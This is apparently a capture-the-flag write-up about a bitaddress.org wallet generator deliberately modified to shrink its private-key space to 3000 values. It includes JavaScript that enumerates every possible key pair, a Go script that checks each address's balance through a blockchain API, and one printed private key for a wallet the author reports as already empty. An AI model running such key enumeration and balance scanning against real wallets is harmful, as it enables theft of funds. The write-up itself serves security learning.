# Blockchain

## Step 1: Identifying vulnerability in the website

First lets downloaded the original/unmodified website ([Bitaddress repository](https://github.com/pointbiz/bitaddress.org)).

```shell
wget -O bitaddress-original.org.html https://raw.githubusercontent.com/pointbiz/bitaddress.org/master/bitaddress.org.html
```

And compare it to the provided source code:

```shell
diff -w bitaddress-original.org.html bitaddress.org.html
```

We find following differences:

```diff
5654c5654,5657
<                       this.priv = ECDSA.getBigRandom(n);
---
>                       this.priv = ECDSA.getBigRandom(n)
>                               .mod(BigInteger.valueOf(3000))
>                               .multiply(new BigInteger("424242424242424244242424244242424242424"))
>                               .add(new BigInteger("SoLongAndThanksForAllTheFish"));
6624c6627,6628
<               <div id="tagline">Open Source JavaScript Client-Side Bitcoin Wallet Generator</div>
---
>               <div id="tagline">Open Source JavaScript Client-Side Bitcoin Wallet Generator. <br>
>                       <b>WARNING: Modified to contain a vulnerability that can be exploited as an exercise.</b></div>

```

This modification reduces the space of all generated the private keys to 3000 (maybe even further :thinking:).

## Step 2

We will act as the evil guy, so the next goal is to generate all possible private keys.
This can be done using following code:

```js
var keyPairs = [];
// this takes quite some time TBH
for (let index = 0; index < 3000; index++) {
    var res = BigInteger.valueOf(index)
        .multiply(new BigInteger("424242424242424244242424244242424242424"))
        .add(new BigInteger("SoLongAndThanksForAllTheFish"));

    var key = new Bitcoin.ECKey(res);
    key.setCompressed(true);
    var publicKey = key.getBitcoinAddress();
    var privateKey = key.getBitcoinWalletImportFormat();

    console.log(index);
    keyPairs.push({
        "publicKey": publicKey,
        "privateKey": privateKey,
    });
}
// and finally copy the generated keyPairs in json format into the clipboard so we can save them locally
copy(JSON.stringify(keyPairs))
```

## Step 3

Now, all that's left is to find the adress that actually has some bitcoins/is being used. For that
I wrote a tiny golang script:

```go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"runtime"

	"golang.org/x/sync/errgroup"
)

type KeyPair struct {
	PublicKey string `json:"publicKey"`
	PrivateKey string `json:"privateKey"`
}

type Info struct {
	Address struct {
		Confirmed struct {
			ReceivedInt int `json:"received_int"`
			BalanceInt int `json:"balance_int"`
		} `json:"confirmed"`
	} `json:"address"`
}

func getWalletInfo(pk string) (inf *Info, err error) {
	res, err := http.Get(fmt.Sprintf("https://api.smartbit.com.au/v1/blockchain/address/%s", pk))
	if err != nil {
		return nil, err
	}
	defer func() {
		err = res.Body.Close()
	}()
	err  = json.NewDecoder(res.Body).Decode(inf)
	if err != nil {
		return nil, err
	}
	return inf, nil
}

func checkBalance(kp KeyPair) (bool, error) {
	log.Printf("checking balance of %q\n", kp.PublicKey)
	data, err := getWalletInfo(kp.PublicKey)
	switch {
	case err !=nil:
		return false, err
	case data.Address.Confirmed.BalanceInt != 0:
	case data.Address.Confirmed.ReceivedInt != 0:
		return true,nil
	}
	return false, nil
}

func main() {
	g, gCtx := errgroup.WithContext(context.Background())
	keys := make(chan KeyPair, 32)

	// one gorutine to load and send the keys for workers
	g.Go(func() error {
		data, err := ioutil.ReadFile("keypairs.json")
		if err != nil {
			return err
		}
		var ks []KeyPair
		err = json.Unmarshal(data, &ks)
		if err != nil {
			return err
		}
		defer close(keys)
		for i := range ks {
			select {
			case keys <- ks[i]:
				continue
			case <-gCtx.Done():
				return nil
			}
		}
		return nil
	})

	// spawn 8 gorutines for each core to process the keys
	for i := 0; i < 8*runtime.NumCPU(); i++ {
		g.Go(func() error {
			for k := range keys {
				treasure, err := checkBalance(k)
				if err != nil {
					// handle the error by logging, we want to continue processing rest of the wallets
					log.Print(err.Error())
					continue
				}
				if treasure {
					log.Printf("!!! Found money !!! %#v\n", k)
				}
			}
			return nil
		})
	}

	err := g.Wait()
	if err != nil {
		log.Fatal(err)
	}
}
```

We find single [wallet](https://api.smartbit.com.au/v1/blockchain/address/1E2mSN7MXVuS4ecafhTLtaokf5RixcYUEU)
with non-zero received/balance values: 

```text
PublicKey:"1E2mSN7MXVuS4ecafhTLtaokf5RixcYUEU", PrivateKey:"KwDiBf89QgGbjEhKnhXJuY4GUMKjkbiQLBXrUaWStqmWnp3XBMte", Id:2562
```

Sadly, it is already empty, maybe next time...
